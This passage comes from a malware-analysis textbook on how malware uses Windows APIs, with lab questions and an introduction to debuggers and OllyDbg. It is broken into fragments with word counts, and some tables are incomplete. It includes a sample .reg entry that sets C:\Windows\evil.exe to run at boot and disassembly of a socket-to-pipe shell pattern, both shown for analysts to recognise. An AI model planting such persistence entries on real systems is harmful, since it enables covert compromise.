ing the information the file contains into the registry—almost like a script 
for modifying the registry. As you might imagine, malware sometimes uses 
.reg files to modify the registry, although it more often directly edits the reg-
istry programmatically.
[Word Count: 62]

Analyzing Malicious Windows Programs
143
[Word Count: 5]

Listing 7-2 shows an example of a .reg file.
[Word Count: 9]

[HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
"MaliciousValue"="C:\Windows\evil.exe"
[Word Count: 2]

The first line in Listing 7-2 simply lists the version of the registry editor. 
In this case, version 5.00 corresponds to Windows XP. The key to be modi-
fied, [HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run], appears within 
brackets. The last line of the .reg file contains the value name and the data 
for that key. This listing adds the value name MaliciousValue, which will 
automatically run C:\Windows\evil.exe each time the OS boots.
[Word Count: 67]

Malware commonly relies on network functions to do its dirty work, and 
there are many Windows API functions for network communication. The 
task of creating network signatures is complicated, and it is the exclusive 
focus of Chapter 14. Our goal here is to show you how to recognize and 
understand common network functions, so you can identify what a malicious 
program is doing when these functions are used.
[Word Count: 68]

Of the Windows network options, malware most commonly uses Berkeley 
compatible sockets, functionality that is almost identical on Windows and 
UNIX systems.
Berkeley compatible sockets’ network functionality in Windows is imple-
mented in the Winsock libraries, primarily in ws2_32.dll. Of these, the socket, 
connect, bind, listen, accept, send, and recv functions are the most common, 
and these are described in Table 7-2.
[Word Count: 62]

Table 7-2: Berkeley Compatible Sockets Networking Functions
[Word Count: 7]

bind
Attaches a socket to a particular port, prior to the accept call
[Word Count: 13]

listen
Indicates that a socket will be listening for incoming connections
[Word Count: 11]

accept
Opens a connection to a remote socket and accepts the connection
[Word Count: 12]

connect
Opens a connection to a remote socket; the remote socket must be waiting for the 
connection
[Word Count: 17]

recv
Receives data from the remote socket
[Word Count: 7]

NOTE
The WSAStartup function must be called before any other networking functions in order 
to allocate resources for the networking libraries. When looking for the start of network 
connections while debugging code, it is useful to set a breakpoint on WSAStartup, because 
the start of networking should follow shortly.
[Word Count: 49]

The Server and Client Sides of Networking
[Word Count: 7]

NOTE
This example leaves out all error handling and parameter setup. A realistic example 
would be littered with calls to WSAGetLastError and other error-handling functions.
[Word Count: 25]

Listing 7-3: A simplified program with a server socket
[Word Count: 9]

Analyzing Malicious Windows Programs
145
[Word Count: 5]

First, WSAStartup initializes the Win32 sockets system, and then a socket is 
created with socket. The bind function attaches the socket to a port, the listen 
call sets up the socket to listen, and the accept call hangs, waiting for a con-
nection from a remote socket.
[Word Count: 47]

In addition to the Winsock API, there is a higher-level API called the WinINet 
API. The WinINet API functions are stored in Wininet.dll. If a program imports 
functions from this DLL, it’s using higher-level networking APIs.
The WinINet API implements protocols, such as HTTP and FTP, at the 
application layer. You can gain an understanding of what malware is doing 
based on the connections that it opens.
[Word Count: 67]


InternetOpen is used to initialize a connection to the Internet.
[Word Count: 11]


InternetOpenUrl is used to connect to a URL (which can be an HTTP page 
or an FTP resource).
[Word Count: 19]


InternetReadFile works much like the ReadFile function, allowing the pro-
gram to read the data from a file downloaded from the Internet.
[Word Count: 23]

Malware can use the WinINet API to connect to a remote server and get 
further instructions for execution.
[Word Count: 18]

There are many ways that malware can transfer execution in addition to the 
jump and call instructions visible in IDA Pro. It’s important for a malware 
analyst to be able to figure out how malware could be inducing other code to 
run. The first and most common way to access code outside a single file is 
through the use of DLLs.
[Word Count: 61]

DLLs are also a useful code-reuse mechanism. For example, large soft-
ware companies will create DLLs with some functionality that is common to 
many of their applications. Then, when they distribute the applications, they 
distribute the main .exe and any DLLs that application uses. This allows them 
to maintain a single library of common code and distribute it only when 
needed.
[Word Count: 61]

To store malicious code
Sometimes, malware authors find it more advantageous to store mali-
cious code in a DLL, rather than in an .exe file. Some malware attaches to 
other processes, but each process can contain only one .exe file. Malware 
sometimes uses DLLs to load itself into another process.
[Word Count: 50]

By using Windows DLLs
Nearly all malware uses the basic Windows DLLs found on every system. 
The Windows DLLs contain the functionality needed to interact with 
the OS. The way that a malicious program uses the Windows DLLs often 
offers tremendous insight to the malware analyst. The imports that you 
learned about in Chapter 1 and the functions covered throughout this 
chapter are all imported from the Windows DLLs. Throughout the bal-
ance of this chapter, we will continue to cover functions from specific 
DLLs and describe how malware uses them.
[Word Count: 91]

By using third-party DLLs
Malware can also use third-party DLLs to interact with other programs. 
When you see malware that imports functions from a third-party DLL, 
you can infer that it is interacting with that program to accomplish its 
goals. For example, it might use the Mozilla Firefox DLL to connect back 
to a server, rather than connecting directly through the Windows API. 
Malware might also be distributed with a customized DLL to use func-
tionality from a library not already installed on the victim’s machine; for 
example, to use encryption functionality that is distributed as a DLL.
[Word Count: 98]

Analyzing Malicious Windows Programs
147
[Word Count: 5]

Most DLLs do not have per-thread resources, and they ignore calls to 
DLLMain that are caused by thread activity. However, if the DLL has resources 
that must be managed per thread, then those resources can provide a hint to 
an analyst as to the DLL’s purpose.
[Word Count: 46]

The function most commonly used by malware to create a new process is 
CreateProcess. This function has many parameters, and the caller has a lot 
of control over how it will be created. For example, malware could call this 
function to create a process to execute its malicious code, in order to bypass
[Word Count: 53]

004010DA  mov     eax, dword ptr [esp+58h+SocketHandle]
004010DE  lea     edx, [esp+58h+StartupInfo]
004010E2  push    ecx             ; lpProcessInformation
004010E3  push    edx             ; lpStartupInfo
004010E4 mov    [esp+60h+StartupInfo.hStdError], eax
004010E8 mov    [esp+60h+StartupInfo.hStdOutput], eax
004010EC mov    [esp+60h+StartupInfo.hStdInput], eax
004010F0 mov    eax, dword_403098
004010F5  push    0               ; lpCurrentDirectory
004010F7  push    0               ; lpEnvironment
004010F9  push    0               ; dwCreationFlags
004010FB  mov     dword ptr [esp+6Ch+CommandLine], eax
004010FF  push    1               ; bInheritHandles
00401101  push    0               ; lpThreadAttributes
00401103  lea     eax, [esp+74h+CommandLine]
00401107  push    0               ; lpProcessAttributes
00401109push    eax             ; lpCommandLine
0040110A  push    0               ; lpApplicationName
0040110C  mov     [esp+80h+StartupInfo.dwFlags], 101h
00401114call    ds:CreateProcessA
[Word Count: 91]

Listing 7-4: Sample code using the CreateProcess call
[Word Count: 8]

Analyzing Malicious Windows Programs
149
[Word Count: 5]

Processes are the container for execution, but threads are what the Windows 
OS executes. Threads are independent sequences of instructions that are 
executed by the CPU without waiting for other threads. A process contains 
one or more threads, which execute part of the code within a process. Threads 
within a process all share the same memory space, but each has its own pro-
cessor registers and stack.
[Word Count: 67]

004010DE  lea
edx, [esp+58h]
004010E2  push    edx
[Word Count: 7]

Listing 7-5: Accessing a local variable and pushing it on the stack
[Word Count: 12]


Malware can use CreateThread to load a new malicious library into a process, 
with CreateThread called and the address of LoadLibrary specified as the 
start address. (The argument passed to CreateThread is the name of the 
library to be loaded. The new DLL is loaded into memory in the process, 
and DllMain is called.)
[Word Count: 55]


Malware can create two new threads for input and output: one to listen 
on a socket or pipe and then output that to standard input of a process, 
and the other to read from standard output and send that to a socket or 
pipe. The malware’s goal is to send all information to a single socket or 
pipe in order to communicate seamlessly with the running application.
[Word Count: 68]

Listing 7-6 shows how to recognize the second technique by identifying 
two CreateThread calls near each other. (Only the system calls for ThreadFunction1 
and ThreadFunction2 are shown.) This code calls CreateThread twice. The argu-
ments are lpStartAddress values, which tell us where to look for the code that 
will run when these threads start.
[Word Count: 54]

004016EE  lea     eax, [ebp+ThreadId]
004016F4  push    eax             ; lpThreadId
004016F5  push    0               ; dwCreationFlags
004016F7  push    0               ; lpParameter
004016F9  push
offset ThreadFunction1 ; lpStartAddress
004016FE  push    0               ; dwStackSize
00401700  lea     ecx, [ebp+ThreadAttributes]
00401706  push    ecx             ; lpThreadAttributes
00401707  call
ds:CreateThread
0040170D  mov     [ebp+var_59C], eax
00401713  lea     edx, [ebp+ThreadId]
00401719  push    edx             ; lpThreadId
0040171A  push    0               ; dwCreationFlags
0040171C  push    0               ; lpParameter
0040171E  push
offset ThreadFunction2 ; lpStartAddress
00401723  push    0               ; dwStackSize
00401725  lea     eax, [ebp+ThreadAttributes]
0040172B  push    eax             ; lpThreadAttributes
0040172C  call
ds:CreateThread
[Word Count: 88]

Listing 7-6: Main function of thread example
[Word Count: 7]

Analyzing Malicious Windows Programs
151
[Word Count: 5]

In Listing 7-6, we have labeled the start function ThreadFunction1  for 
the first call to CreateThread  and ThreadFunction2  for the second call . To 
determine the purpose of these two threads, we first navigate to ThreadFunction1. 
As shown in Listing 7-7, the first thread function executes a loop in which it 
calls ReadFile to read from a pipe, and then it forwards that data out to a 
socket with the send function.
[Word Count: 75]

...
004012C5  call    ds:ReadFile
...
00401356  call    ds:send
...
[Word Count: 9]

Listing 7-7: ThreadFunction1 of thread example
[Word Count: 6]

As shown in Listing 7-8, the second thread function executes a loop that 
calls recv to read any data sent over the network, and then forwards that data 
to a pipe with the WriteFile function, so that it can be read by the application.
[Word Count: 44]

...
004011F2  call    ds:recv
...
00401271  call    ds:WriteFile
...
[Word Count: 9]

Listing 7-8: ThreadFunction2 of thread example
[Word Count: 6]

NOTE
In addition to threads, Microsoft systems use fibers. Fibers are like threads, but are 
managed by a thread, rather than by the OS. Fibers share a single thread context.
[Word Count: 30]

A mutex can be created with the CreateMutex function. One process can 
get a handle to another process’s mutex by using the OpenMutex call. Malware 
will commonly create a mutex and attempt to open an existing mutex with 
the same name to ensure that only one version of the malware is running at a 
time, as demonstrated in Listing 7-9.
[Word Count: 60]

00401000 
push  offset Name     ; "HGL345"
00401005 
push  0               ; bInheritHandle
00401007 
push  1F0001h         ; dwDesiredAccess
0040100C call  ds:__imp__OpenMutexW@12 ; OpenMutexW(x,x,x)
00401012 test  eax, eax
00401014 jz    short loc_40101E
00401016 
push  0               ; int
00401018 call  ds:__imp__exit
0040101E 
push  offset Name     ; "HGL345"
00401023 
push  0               ; bInitialOwner
00401025 
push  0               ; lpMutexAttributes
00401027 call  ds:__imp__CreateMutexW@12 ; CreateMutexW(x,x,x)
[Word Count: 58]

Listing 7-9: Using a mutex to ensure that only one copy of malware is running on a system
[Word Count: 18]

The code in Listing 7-9 uses the hard-coded name HGL345 for the mutex. 
It first checks to see if there is a mutex named HGL345 using the OpenMutex call 
at . If the return value is NULL at , it jumps (at ) over the exit call and 
continues to execute. If the return value is not NULL, it calls exit at , and 
the process will exit. If the code continues to execute, the mutex is created 
at  to ensure that additional instances of the program will exit when they 
reach this code.
[Word Count: 95]

NOTE
It is possible to list running services using net start at the command line, but doing 
so will display only the names of running services. Programs, such as the Autoruns tool 
mentioned earlier, can be used to gather more information about running services.
[Word Count: 44]

Analyzing Malicious Windows Programs
153
[Word Count: 5]

Services can be installed and manipulated via a few Windows API func-
tions, which are prime targets for malware. There are several key functions to 
look for:
[Word Count: 27]

OpenSCManager
Returns a handle to the service control manager, which is 
used for all subsequent service-related function calls. All code that will 
interact with services will call this function.
[Word Count: 29]

CreateService
Adds a new service to the service control manager, and 
allows the caller to specify whether the service will start automatically at 
boot time or must be started manually.
[Word Count: 30]

StartService
Starts a service, and is used only if the service is set to be 
started manually.
[Word Count: 17]

Figure 7-2: Registry entry for VMware NAT service
[Word Count: 8]

The code for the VMware NAT service is stored at C:\Windows\system32\
vmnat.exe . The type value of 0x10  corresponds to WIN32_OWN_PROCESS, and 
the start value of 0x02  corresponds to AUTO_START.
The SC program is a command-line tool included with Windows that 
you can use to investigate and manipulate services. It includes commands for 
adding, deleting, starting, stopping, and querying services. For example, the
[Word Count: 65]

qc command queries a service’s configuration options by accessing the same 
information as the registry entry shown in Figure 7-2 in a more readable way. 
Listing 7-10 shows the SC program in action.
[Word Count: 33]

C:\Users\User1>sc qc "VMware NAT Service"
[SC] QueryServiceConfig SUCCESS
[Word Count: 8]

SERVICE_NAME: VMware NAT Service
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   
AUTO_START
        ERROR_CONTROL      : 1   
NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\vmnat.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VMware NAT Service
        DEPENDENCIES       : VMnetuserif
        SERVICE_START_NAME : LocalSystem
[Word Count: 35]

Listing 7-10: The query configuration information command of the SC program
[Word Count: 11]

Listing 7-10 shows the query configuration information command. This 
information is identical to what was stored in the registry for the VMware 
NAT service, but it is easier to read because the numeric values have mean-
ingful labels such as WIN32_OWN_PROCESS . The SC program has many different 
commands, and running SC without any parameters will result in a list of the 
possible commands. (For more about malware that runs as a service, see 
Chapter 11.)
[Word Count: 76]

Analyzing Malicious Windows Programs
155
[Word Count: 5]

malware analyst can search for these calls to determine whether a program is 
using COM functionality. However, knowing that a piece of malware uses a 
COM object as a client does not provide much information, because COM 
objects are diverse and widespread. Once you determine that a program uses 
COM, you’ll need to find a couple of identifiers of the object being used to 
continue analysis.
[Word Count: 66]

CLSIDs, IIDs, and the Use of COM Objects
[Word Count: 8]

00401024  lea     eax, [esp+18h+PointerToComObject]
00401028  push    eax             ; ppv
00401029  push
offset IID_IWebBrowser2 ; riid
0040102E  push    4               ; dwClsContext
00401030  push    0               ; pUnkOuter
00401032  push
offset stru_40211C ; rclsid
00401037  call    CoCreateInstance
[Word Count: 34]

Listing 7-11: Accessing a COM object with CoCreateInstance
[Word Count: 8]

In order to understand the code, click the structures that store the IID 
and CLSID at  and . The code specifies the IID D30C1661-CDAF-11D0-8A3E-
00C04FC9E26E, which represents the IWebBrowser2 interface, and the CLSID 
0002DF01-0000-0000-C000-000000000046, which represents Internet Explorer. 
IDA Pro can recognize and label the IID for IWebBrowser2, since it’s com-
monly used. Software developers can create their own IIDs, so IDA Pro 
can’t always label the IID used by a program, and it is never able to label 
the CLSID, because disassembly doesn’t contain the necessary information.
[Word Count: 89]

0040105E  push    ecx
0040105F  push    ecx
00401060  push    ecx
00401061  mov     esi, eax
00401063  mov     eax, [esp+24h+PointerToComObject]
00401067  mov     edx, [eax]
00401069  mov     edx, [edx+2Ch]
0040106C  push    ecx
0040106D  push    esi
0040106E  push    eax
0040106F  call    edx
[Word Count: 37]

Analyzing Malicious Windows Programs
157
[Word Count: 5]

objects are implemented as DLLs that are loaded into the process space of 
the COM client executable. When the COM object is set up to be loaded as a 
DLL, the registry entry for the CLSID will include the subkey InprocServer32, 
rather than LocalServer32.
[Word Count: 44]

01006170  push  offset loc_10061C0
01006175  mov     eax, large fs:0
0100617B  push  eax
0100617C  mov     large fs:0, esp
[Word Count: 17]

Listing 7-13: Storing exception-handling information in fs:0
[Word Count: 7]

Eventually, if none of the exception handlers responds to an exception, the 
top-level exception handler crashes the application.
Exception handlers can be used in exploit code to gain execution. A 
pointer to exception-handling information is stored on the stack, and during 
a stack overflow, an attacker can overwrite the pointer. By specifying a new 
exception handler, the attacker gains execution when an exception occurs. 
Exceptions will be covered in more depth in the debugging and anti-debugging 
chapters (Chapters 8–10, 15, and 16).
[Word Count: 82]

Analyzing Malicious Windows Programs
159
[Word Count: 5]

Developing kernel-mode code is considerably more difficult than devel-
oping user code. One major hurdle is that kernel code is much more likely 
to crash a system during development and debugging. Too, many common 
functions are not available in the kernel, and there are fewer tools for com-
piling and developing kernel-mode code. Due to these challenges, only 
sophisticated malware runs in the kernel. Most malware has no kernel com-
ponent. (For more on analyzing kernel malware, see Chapter 10.)
[Word Count: 80]

Figure 7-4: Using the Native API to avoid detection
[Word Count: 9]

There are a series of Native API calls that can be used to get information 
about the system, processes, threads, handles, and other items. These include 
NtQuerySystemInformation, NtQueryInformationProcess, NtQueryInformationThread, 
NtQueryInformationFile, and NtQueryInformationKey. These calls provide much 
more detailed information than any available Win32 calls, and some of these 
functions allow you to set fine-grained attributes for files, processes, threads, 
and so on.
[Word Count: 62]

Analyzing Malicious Windows Programs
161
[Word Count: 5]

Another Native API function that is popular with malware authors is 
NtContinue. This function is used to return from an exception, and it is meant 
to transfer execution back to the main thread of a program after an excep-
tion has been handled. However, the location to return to is specified in the 
exception context, and it can be changed. Malware often uses this function 
to transfer execution in complicated ways, in order to confuse an analyst and 
make a program more difficult to debug.
[Word Count: 85]

NOTE
We covered several functions that start with the prefix Nt. In some instances, such as in 
the export tables of ntdll.dll, the same function can have either the Nt prefix or the Zw 
prefix. For example, there is an NtReadFile function and a ZwReadFile function. In the 
user space, these functions behave in exactly the same way, and usually call the exact 
same code. There are sometimes minor differences when called from kernel mode, but 
those differences can be safely ignored by the malware analyst.
[Word Count: 86]

Native applications are applications that do not use the Win32 subsystem 
and issue calls to the Native API only. Such applications are rare for malware, 
but are almost nonexistent for nonmalicious software, and so a native appli-
cation is likely malicious. The subsystem in the PE header indicates if a pro-
gram is a native application.
[Word Count: 56]

This chapter covered Windows concepts that are important to malware anal-
ysis. The concepts such as processes, threads, and network functionality will 
come up as you’re analyzing malware.
Many of the specific malware examples discussed in this chapter are very 
common, and your familiarity with them will allow you to recognize them 
quickly in malware in order to better understand the program’s overall pur-
pose. These concepts are important to static malware analysis, and they will 
come up in the labs throughout this book, as well as in real-world malware.
[Word Count: 90]

Analyze the malware found in the file Lab07-01.exe.
[Word Count: 8]

1.
How does this program ensure that it continues running (achieves per-
sistence) when the computer is restarted?
[Word Count: 18]

3.
What is a good host-based signature to use for detecting this program?
[Word Count: 13]

4.
What is a good network-based signature for detecting this malware?
[Word Count: 11]

6.
When will this program finish executing?
[Word Count: 7]

Analyze the malware found in the file Lab07-02.exe.
[Word Count: 8]

1.
How does this program achieve persistence?
[Word Count: 7]

3.
When will this program finish executing?
[Word Count: 7]

WARNING 
This lab may cause considerable damage to your computer and may be difficult to 
remove once installed. Do not run this file without a virtual machine with a snapshot 
taken prior to execution.
[Word Count: 34]

This lab may be a bit more challenging than previous ones. You’ll need 
to use a combination of static and dynamic methods, and focus on the big 
picture in order to avoid getting bogged down by the details.
[Word Count: 38]

Analyzing Malicious Windows Programs
163
[Word Count: 5]

1.
How does this program achieve persistence to ensure that it continues 
running when the computer is restarted?
[Word Count: 18]

2.
What are two good host-based signatures for this malware?
[Word Count: 10]

4.
How could you remove this malware once it is installed?
[Word Count: 11]

A D V A N C E D  D Y N A M I C  A N A L Y S I S
[Word Count: 23]

example, you can change the value of a single variable at any point in 
time—all you need is enough information about that variable, including 
its location.
In the next two chapters, we will cover two debuggers: OllyDbg and 
WinDbg. This chapter will focus on the concepts and features common to 
all debuggers.
[Word Count: 52]

Source-Level vs. Assembly-Level Debuggers
[Word Count: 4]

NOTE
It is possible to run a kernel debugger on the same system as the code being debugged, but 
it is very uncommon. A program called SoftICE used to provide this functionality, but it 
has not been supported since early 2007. No vendor currently offers a product with this 
functionality.
[Word Count: 50]

There are different software packages for user-mode debugging and ker-
nel debugging. WinDbg is currently the only popular tool that supports kernel 
debugging. OllyDbg is the most popular debugger for malware analysts, but
[Word Count: 33]

it does not support kernel debugging. WinDbg supports user-mode debug-
ging as well, and IDA Pro has a built-in debugger, but these do not offer the 
same features or ease of use as OllyDbg.
[Word Count: 34]

mov
edi, DWORD_00406904
mov
ecx, 0x0d
LOC_040106B2
xor
[edi], 0x9C
inc
edi
loopw
LOC_040106B2
...
DWORD:00406904:   F8FDF3D0
[Word Count: 17]

D0F3FDF8 D0F5FEEE FDEEE5DD 9C (.............)
4CF3FDF8 D0F5FEEE FDEEE5DD 9C (L............)
4C6FFDF8 D0F5FEEE FDEEE5DD 9C (Lo...........)
4C6F61F8 D0F5FEEE FDEEE5DD 9C (Loa..........)
. . . SNIP . . .
4C6F6164 4C696272 61727941 00 (LoadLibraryA.)
[Word Count: 32]

Listing 8-2: Single-stepping through a section of code to see how it changes memory
[Word Count: 14]

With a debugger attached, it is clear that this function is using a single-
byte XOR function to decode the string LoadLibraryA. It would have been 
more difficult to identify that string with only static analysis.
[Word Count: 36]

NOTE
This is a good time to use VMware’s record/replay feature. When you step-over a func-
tion that never returns, you can replay the debugging session and correct your mistake. 
Start a recording when you begin debugging. Then, when you step-over a function that 
never returns, stop the recording. Replay it to just before you stepped-over the function, 
and then stop the replay and take control of the machine, but this time, step-into the 
function.
[Word Count: 75]

When stepping-into a function, it is easy to quickly begin single-stepping 
through instructions that have nothing to with what you are analyzing. When 
analyzing a function, you can step-into a function that it calls, but then it 
will call another function, and then another. Before long, you are analyzing 
code that has little or no relevance to what you are seeking. Fortunately, most 
debuggers will allow you to return to the calling function, and some debug-
gers have a step-out function that will run until after the function returns.
[Word Count: 89]

Other debuggers have a similar feature that executes until a return instruc-
tion immediately prior to the end of the function.
[Word Count: 21]

00401008   mov     ecx, [ebp+arg_0]
0040100B   mov     eax, [edx]
0040100D   call    eax
[Word Count: 11]

0040100B  xor     eax, esp
0040100D  mov     [esp+0D0h+var_4], eax
00401014  mov     eax, edx
00401016  mov     [esp+0D0h+NumberOfBytesWritten], 0
0040101D  add     eax, 0FFFFFFFEh
00401020  mov     cx, [eax+2]
00401024  add     eax, 2
00401027  test    cx, cx
0040102A  jnz     short loc_401020
0040102C  mov     ecx, dword ptr ds:a_txt ; ".txt"
00401032  push    0               ; hTemplateFile
00401034  push    0               ; dwFlagsAndAttributes
00401036  push    2               ; dwCreationDisposition
00401038  mov     [eax], ecx
0040103A  mov     ecx, dword ptr ds:a_txt+4
00401040  push    0               ; lpSecurityAttributes
00401042  push    0               ; dwShareMode
[Word Count: 79]

00401044  mov     [eax+4], ecx
00401047  mov     cx, word ptr ds:a_txt+8
0040104E  push    0               ; dwDesiredAccess
00401050  push    edx             ; lpFileName
00401051  mov     [eax+8], cx
00401055call    CreateFileW ; CreateFileW(x,x,x,x,x,x,x)
[Word Count: 28]

Listing 8-4: Using a debugger to determine a filename
[Word Count: 9]

We set a breakpoint on the call to CreateFileW at , and then look at 
the values on the stack when the breakpoint is triggered. Figure 8-1 shows a 
screenshot of the same instruction at a breakpoint within the WinDbg debug-
ger. After the breakpoint, we display the first parameter to the function as an 
ASCII string using WinDbg. (You’ll learn how to do this in Chapter 10, which 
covers WinDbg.)
[Word Count: 71]

Figure 8-1: Using a breakpoint to see the parameters to a function call. We set a break-
point on CreateFileW and then examine the first parameter of the stack.
[Word Count: 29]

004010D0  sub     esp, 0CCh
004010D6  mov     eax, dword_403000
004010DB  xor     eax, esp
004010DD  mov     [esp+0CCh+var_4], eax
004010E4  lea     eax, [esp+0CCh+buf]
004010E7  call    GetData
004010EC  lea     eax, [esp+0CCh+buf]
004010EFcall    EncryptData
004010F4  mov     ecx, s
004010FA  push    0               ; flags
004010FC  push    0C8h            ; len
00401101  lea     eax, [esp+0D4h+buf]
00401105  push    eax             ; buf
00401106  push    ecx             ; s
00401107  call    ds:Send
[Word Count: 60]

Listing 8-5: Using a breakpoint to view data before the program encrypts it
[Word Count: 13]

Figure 8-2 shows a debug window from OllyDbg that displays the buffer 
in memory prior to being sent to the encryption routine. The top window 
shows the instruction with the breakpoint, and the bottom window displays 
the message. In this case, the data being sent is Secret Message, as shown in the 
ASCII column at the bottom right.
[Word Count: 58]

Figure 8-2: Viewing program data prior to the encryption function call
[Word Count: 11]

You can use several different types of breakpoints, including software 
execution, hardware execution, and conditional breakpoints. Although all 
breakpoints serve the same general purpose, depending on the situation, 
certain breakpoints will not work where others will. Let’s look at how each 
one works.
[Word Count: 43]

So far, we have been talking about software execution breakpoints, which cause a 
program to stop when a particular instruction is executed. When you set a
[Word Count: 26]

breakpoint without any options, most popular debuggers set a software exe-
cution breakpoint by default. 
The debugger implements a software breakpoint by overwriting the 
first byte of an instruction with 0xCC, the instruction for INT 3, the breakpoint 
interrupt designed for use with debuggers. When the 0xCC instruction is exe-
cuted, the OS generates an exception and transfers control to the debugger.
Table 8-1 shows a memory dump and disassembly of a function with a 
breakpoint set, side by side.
[Word Count: 80]

Table 8-1: Disassembly and Memory Dump of a Function with a Breakpoint Set
[Word Count: 13]

00401130 55               push    ebp
00401131 8B EC              mov     ebp, esp
00401133 83 E4 F8           and     esp, 0FFFFFFF8h
00401136 81 EC A4 03 00 00  sub     esp, 3A4h
0040113C A1 00 30 40 00     mov     eax, dword_403000
[Word Count: 36]

00401130CC 8B EC 83
00401134  E4 F8 81 EC
00401138  A4 03 00 00
0040113C  A1 00 30 40
00401140  00
[Word Count: 21]

Exceptions are the principal way that a debugger gains control of a running 
program. Under the hood, even breakpoints generate exceptions, but non-
debugging related events, such as invalid memory accesses and division by 
zero, will do so as well.
[Word Count: 40]

Exceptions are not specific to malware, malware analysis, or debugging. 
They are often caused by bugs, which is why debuggers usually handle them. 
But exceptions can also be used to govern the flow of execution in a normal 
program without involving a debugger. There is functionality in place to 
ensure that the debugger and the program being debugged can both use 
exceptions.
[Word Count: 62]

When the trap flag is set, the processor executes one instruction and then 
generates an exception.
A memory-access violation exception is generated when code tries to access 
a location that it cannot access. This exception usually occurs because the 
memory address is invalid, but it may occur because the memory is not acces-
sible due to access-control protections. 
Certain instructions can be executed only when the processor is in privi-
leged mode. When the program attempts to execute them outside privileged 
mode, the processor generates an exception.
[Word Count: 87]

NOTE
Privileged mode is the same as kernel mode, and nonprivileged mode is the same 
as user mode. The terms privileged and nonprivileged are more commonly used 
when talking about the processor. Examples of privileged instructions are ones that 
write to hardware or modify the memory page tables.
[Word Count: 48]

The last example in this chapter comes from a real virus that performed dif-
ferently depending on the language settings of the computer infected. If the 
language setting was simplified Chinese, the virus uninstalled itself from the 
machine and caused no damage. If the language setting was English, it dis-
played a pop-up with a poorly translated message saying, “You luck’s so good.” 
If the language setting was Japanese or Indonesian, the virus overwrote the
[Word Count: 75]

hard drive with garbage data in an effort to destroy the computer. Let’s see 
how we could analyze what this program would do on a Japanese system with-
out actually changing our language settings. 
Listing 8-7 shows the assembly code for differentiating between language 
settings. The program first calls the function GetSystemDefaultLCID. Next, based 
on the return value, the program calls one of three different functions: The 
locale IDs for English, Japanese, Indonesian, and Chinese are 0x0409, 0x0411, 
0x0421, and 0x0C04, respectively.
[Word Count: 82]

00411349   call    GetSystemDefaultLCID
0041134F mov     [ebp+var_4], eax
00411352   cmp     [ebp+var_4], 409h
00411359   jnz     short loc_411360
0041135B   call    sub_411037
00411360   cmp     [ebp+var_4], 411h
00411367   jz      short loc_411372
00411369   cmp     [ebp+var_4], 421h
00411370   jnz     short loc_411377
00411372   call    sub_41100F 
00411377   cmp     [ebp+var_4], 0C04h
0041137E   jnz     short loc_411385
00411380   call    sub_41100A
[Word Count: 48]

Listing 8-6: Assembly for differentiating between language settings
[Word Count: 8]

Debugging is a critical tool for obtaining information about a malicious pro-
gram that would be difficult to obtain through disassembly alone. You can 
use a debugger to single-step through a program to see exactly what’s hap-
pening internally or to set breakpoints to get information about particular 
sections of code. You can also use a debugger to modify the execution of a 
program in order to gain additional information. 
It takes practice to be able to analyze malware effectively with a debug-
ger. The next two chapters cover the specifics of using the OllyDbg and 
WinDbg debuggers.
[Word Count: 98]

This chapter focuses on OllyDbg, an x86 debugger 
developed by Oleh Yuschuk. OllyDbg provides the abil-
ity to analyze malware while it is running. OllyDbg is 
commonly used by malware analysts and reverse engi-
neers because it’s free, it’s easy to use, and it has many 
plug-ins that extend its capabilities.
[Word Count: 51]

There are several ways to begin debugging malware with OllyDbg. You can 
load executables and even DLLs directly. If malware is already running on 
your system, you can attach to the process and debug that way. OllyDbg pro-
vides a flexible system to run malware with command-line options or to exe-
cute specific functionality within a DLL.
[Word Count: 57]

The easiest way to debug malware is to select FileOpen, and then browse to 
the executable you wish to load, as shown in Figure 9-1. If the program you 
are debugging requires arguments, specify them in the Arguments field of 
the Open dialog. (During loading is the only time you can pass command-
line arguments to OllyDbg.)
[Word Count: 57]

Figure 9-1: Opening an executable with command-line 
options
[Word Count: 8]

Once you’ve opened an executable, OllyDbg will load the binary using 
its own loader. This works similarly to the way that the Windows OS loads 
a file.
By default, OllyDbg will pause at the software developer’s entry point, 
known as WinMain, if its location can be determined. Otherwise, it will break at 
the entry point as defined in the PE header. You can change these startup 
options by selecting from OllyDbg’s Debugging Options menu (Options
Debugging Options). For example, to break immediately before any code 
executes, select System Breakpoint as the startup option.
[Word Count: 93]

NOTE
OllyDbg 2.0 has more breaking capabilities than version 1.1. For example, it can be set 
to pause at the start of a TLS callback. TLS callbacks can allow malware to execute 
before OllyDbg pauses execution. In Chapter 16, we discuss how TLS callbacks can be 
used for anti-debugging and how to protect yourself from them.
[Word Count: 56]

As soon as you load a program into OllyDbg, you will see four windows filled 
with information that you will find useful for malware analysis, as shown in 
Figure 9-2.
[Word Count: 30]

These windows display information as follows:
[Word Count: 6]

Disassembler window 
This window shows the debugged program’s 
code—the current instruction pointer with several instructions before 
and after it. Typically, the next instruction to be executed will be high-
lighted in this window. To modify instructions or data (or add new 
assembly instructions), press the spacebar within this window.
[Word Count: 50]

Stack window 
This window shows the current state of the stack in 
memory for the thread being debugged. This window will always show 
the top of the stack for the given thread. You can manipulate stacks in 
this window by right-clicking a stack location and selecting Modify. 
OllyDbg places useful comments on some stack locations that describe
[Word Count: 58]

Registers window 
This window 
shows the current state of the registers 
for the debugged program. As the code 
is debugged, these registers will change 
color from black to red once the previ-
ously executed instruction has modified 
the register. As in the disassembler win-
dow, you can modify data in the registers 
window as the program is debugged by 
right-clicking any register value and 
selecting Modify. You will be presented 
with the Modify dialog, as shown in Fig-
ure 9-3. You can then change the value.
[Word Count: 87]

the arguments placed on the stack before an API call. These aid analysis, 
since you won’t need to figure out the stack order and look up the API 
argument ordering.
[Word Count: 30]

Memory dump window 
This window shows a dump of live memory 
for the debugged process. Press CTRL-G in this window and enter a 
memory location to dump any memory address. (Or click a memory 
address and select Follow in Dump to dump that memory address.) 
To edit memory in this window, right-click it and choose BinaryEdit. 
This can be used to modify global variables and other data that malware 
stores in RAM.
[Word Count: 73]

The Memory Map window (ViewMemory) displays all memory blocks allo-
cated by the debugged program. Figure 9-4 shows the memory map for the 
Netcat program.
[Word Count: 25]

Figure 9-4: Memory map for Netcat (nc.exe)
[Word Count: 7]

The memory map is great way to see how a program is laid out in memory. 
